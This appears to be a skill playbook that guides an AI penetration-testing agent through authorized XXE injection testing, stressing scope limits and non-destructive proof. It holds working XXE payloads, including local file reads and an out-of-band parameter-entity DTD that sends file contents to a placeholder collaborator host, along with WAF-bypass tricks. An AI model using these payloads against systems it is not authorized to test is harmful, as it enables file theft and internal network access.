---
name: xxe-testing
description: "Invoke this skill when testing an authorized XML-accepting input for XML external entity injection (coverage class `xxe`): native XML bodies, JSON->XML content-type swaps, SOAP envelopes, SVG uploads, and OOXML (docx/xlsx). Covers read-only detection, in-band file read and out-of-band DTD exfiltration, parameter-entity and encoding bypass, and recording the result."
---

# XXE Testing (coverage class: `xxe`)

> **Platform note (hainguyen0207):** this skill comes from a variant with an exploit-coverage matrix. This platform has
> no `record_coverage_cell` / `record_methodology_gap` tools. Wherever the text says to record or close a matrix
> "cell" (one endpoint × parameter), follow **Recording the result** below instead: `report_finding` for a
> confirmed issue, otherwise a per-parameter test summary in your result. `traffic_ref` = the request ids you get
> from `traffic_search` (the recording proxy). Destructive steps are gated by the platform's red-set sign-off.

A per-class testing playbook that turns one `(endpoint, param)` cell of the
exploit-coverage matrix from `untested` into `tested`, `finding`, or a proven
`n/a`. It is the hunting detail behind the matrix: feed an XML parser a controlled
DOCTYPE through the recording proxy, read how the entity is resolved, adapt, and
record the trail. Use it alongside `api-security` (which maps where XML is
accepted — SOAP services, XML bodies, file uploads, Content-Type-tampering of a
JSON endpoint) — this skill decides whether a given parser resolves an external
entity you control.

Attribution: adapted from the `xxe-testing` skill of
[AntiFox-AI/antifox](https://github.com/AntiFox-AI/antifox) (AGPL-3.0). Rewritten
in English, gated for authorized engagements, and bound to the coverage matrix;
no source was copied verbatim.

## Boundaries

- Authorized scope only. The XML-accepting endpoint must be in the task's scope,
  and when an entity reaches out over the network (external DTD, SSRF-via-XXE) the
  *destination* must stay inside the authorized scope and egress allowlist —
  prefer an out-of-band host you control over blind internal probing.
- Non-destructive by default. Detection and confirmation read a single
  non-sensitive file or trigger one out-of-band callback. Never use the parser to
  drive side effects — no `expect://`/`jar:` command execution, no writes to
  internal services, no Billion-Laughs/quadratic-blowup payloads fired at a live
  target. Those cross the destructive line and require the operator's sign-off
  (the red-set gate), not your own decision.
- Proof, not exfiltration. Confirm with the minimum: read one deliberately
  non-sensitive file (`/etc/hostname`, or `C:\Windows\win.ini` on Windows), or
  land one OOB callback that echoes a short controlled marker. Do not read
  `/etc/shadow`, application secrets, or private keys; one harmless file is
  sufficient evidence.
- Billion Laughs / entity-expansion DoS is noted for the report as a bounded
  observation only — never fired. A nested-entity bomb is a denial-of-service
  payload; demonstrating it degrades the service and crosses the destructive line.
- Every claim needs a replayable artifact: the exact XML you sent, the exact
  response (or the out-of-band interaction), captured in the recording proxy.

## Method

Work one parameter / one XML-accepting endpoint at a time. Baseline first, then
escalate only as the parser's behavior justifies it. Always send through the
recording proxy so each attempt is captured.

### 1. Reach and baseline
- Confirm the endpoint actually parses XML. Native XML or SOAP bodies obviously
  do; for a JSON endpoint, try swapping `Content-Type: application/json` to
  `application/xml` (or `text/xml`) and sending an equivalent XML document — many
  frameworks will parse either. File uploads that accept SVG, docx, or xlsx parse
  XML inside the container.
- Record the normal response (status, length, timing, any echoed field value) so
  every later payload is judged against a real baseline. A parser that rejects all
  DOCTYPEs outright is a candidate `n/a` once shown by evidence.

### 2. Detection (read-only)
- Benign internal-entity probe first — no external fetch, so it is safe and
  confirms DTD processing is on:
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE r [ <!ENTITY probe "xxe-marker-7f3a"> ]>
  <r>&probe;</r>
  ```
  If `xxe-marker-7f3a` appears reflected in a response field, the parser expands
  entities and in-band reflection is available.
- In-band file read, scoped to a non-sensitive file:
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
  <r>&xxe;</r>
  ```
  Place `&xxe;` in whichever element the app echoes back (reuse the reflected
  field found above). On Windows use `file:///C:/Windows/win.ini`.
- Out-of-band probe when nothing is reflected (blind): point an entity at a host
  you control and watch for the inbound hit — this both confirms XXE and is the
  SSRF-via-XXE primitive:
  ```xml
  <!DOCTYPE r [ <!ENTITY xxe SYSTEM "http://<your-collaborator>/nonce-7f3a"> ]>
  ```

### 3. Context identification
- Classify the sink: in-band (entity value is reflected) vs blind (no reflection,
  OOB only). Note whether general entities are blocked but parameter entities are
  not, and whether the response surfaces parser errors (error-based XXE can leak
  file contents inside an exception message).
- Fingerprint the stack where it matters for later syntax: `file://` works
  broadly; `php://filter/convert.base64-encode/resource=…` base64-wraps a file on
  PHP so binary/multiline content survives XML; a `netdoc:`/`jar:` scheme hints at
  Java. Confirm the OS from the first file read to pick correct paths afterward.

### 4. Bounded confirmation
- In-band: the one non-sensitive file is read and its contents appear in the
  response — capture request and response. Done.
- Blind, out-of-band via an external parameter-entity DTD. Host a DTD you control
  and reference it:
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE r [ <!ENTITY % ext SYSTEM "http://<your-collaborator>/x.dtd"> %ext; ]>
  <r>test</r>
  ```
  `x.dtd` reads a non-sensitive file and sends a short marker back out-of-band
  (the nested-entity/`%`-escape form is required because parameter entities cannot
  be used directly inside the internal subset):
  ```xml
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<your-collaborator>/?x=%file;'>">
  %eval;
  %exfil;
  ```
  One callback carrying the hostname is proof. Keep the exfiltrated value to a
  single short non-sensitive file.
- Error-based fallback when OOB egress is blocked: make the external DTD throw with
  the file content in the path so it surfaces in a returned parser error, rather
  than pulling full files.
- SSRF-via-XXE: a single in-scope internal callback (or a reachable in-scope
  service responding) is enough to show the reach; do not sweep the internal
  network (see `ssrf-testing` for destination discipline).
- Stop at proof. One file or one callback closes the cell; do not escalate to
  secrets, mass file reads, or command-execution schemes.

### 5. Filter / WAF adaptation
When DOCTYPEs or entities are filtered, record the filter behavior and try
context-appropriate, in-scope techniques — a block is itself worth recording, not
a proven `n/a`:
- Container delivery: embed the DOCTYPE inside an **SVG** upload, or inside
  `word/document.xml` of a **docx** / `xl/workbook.xml` of an **xlsx** (OOXML is a
  zip of XML parts), when a direct XML body is filtered but a file upload is not.
- Parameter entities (`<!ENTITY % … >`) when general entities (`&xxe;`) are
  stripped; the external-DTD form above relies on them.
- Encoding: deliver the XML as UTF-16 / UTF-7 with a matching declaration, or
  percent-encode the path inside the `SYSTEM` URL, to slip a signature that only
  matches ASCII `<!DOCTYPE`.
- On PHP, wrap the target in `php://filter/convert.base64-encode/resource=…` so a
  file that would break XML well-formedness still comes back cleanly.
- A `local DTD` reuse trick (referencing a DTD file already on disk and
  redefining one of its entities) when external network fetches are blocked but a
  known local DTD path exists.

## Recording the result

Record every `xxe` outcome so nothing is lost and nothing is re-tested:
- **Confirmed** - call `report_finding` with the exact replayable request and response (cite the proxy request
  ids from `traffic_search`), the injection point/context, and the demonstrated impact. The reporter agent then
  writes the full report; do not exaggerate severity beyond what you proved.
- **Tested, not vulnerable** - in your result, list each (endpoint, parameter) you tested for `xxe`, the payload
  families tried, the app's reaction to each, the follow-ups those reactions prompted, and why you stopped. A
  single bare payload on a reachable parameter is NOT "tested" - adapt to what the response tells you.
- **Not applicable** - only with a proven reason the class cannot apply here (shown by evidence), never an
  assumption from the endpoint's name.

Reading source code or a config is not testing: a negative claim must rest on real requests sent through the
recording proxy.

## Tools

| Tool | Use | Notes |
|---|---|---|
| recording proxy + curl | send XML/SOAP/upload payloads, capture request/response for `traffic_ref` | always available |
| out-of-band collaborator + a hosted DTD | catch blind-XXE DNS/HTTP callbacks and serve the external DTD | use an allowlisted domain you control; Burp Collaborator via MCP when wired |
| Burp (MCP, when connected) | Repeater for iterative DOCTYPEs, Collaborator payloads | only where a Burp instance is wired |
| XXEinjector | automated OOB file-read / blind-XXE exploitation | NOT installed by default — verify (`command -v XXEinjector` / check the repo) before use; if absent, use the manual method above and record the attempts. When present, keep it within scope and non-destructive: read the one non-sensitive file to confirm, no recursive directory harvesting or secret exfiltration on a live target. |
| oxml_xxe / a zip tool | inject a DOCTYPE into docx/xlsx/svg containers | NOT installed by default — verify before use; a zip tool is enough to repack OOXML by hand. Keep the injected entity read-only and non-sensitive. |

## Completion self-check

- [ ] Every `tested`/`finding` cell cites a real proxy request (`traffic_ref`)
      sent during this task, not a source read.
- [ ] Confirmation read one deliberately non-sensitive file (`/etc/hostname` /
      `win.ini`) or landed one OOB callback — no secrets, keys, or `/etc/shadow`.
- [ ] No entity-expansion (Billion Laughs) or command-execution scheme
      (`expect:`/`jar:`) was fired at a live target; any SSRF-via-XXE destination
      stayed inside authorized scope.
- [ ] Any `n/a` cites evidence that the parser rejects external entities across
      general-entity, parameter-entity, and container delivery, not an assumption.
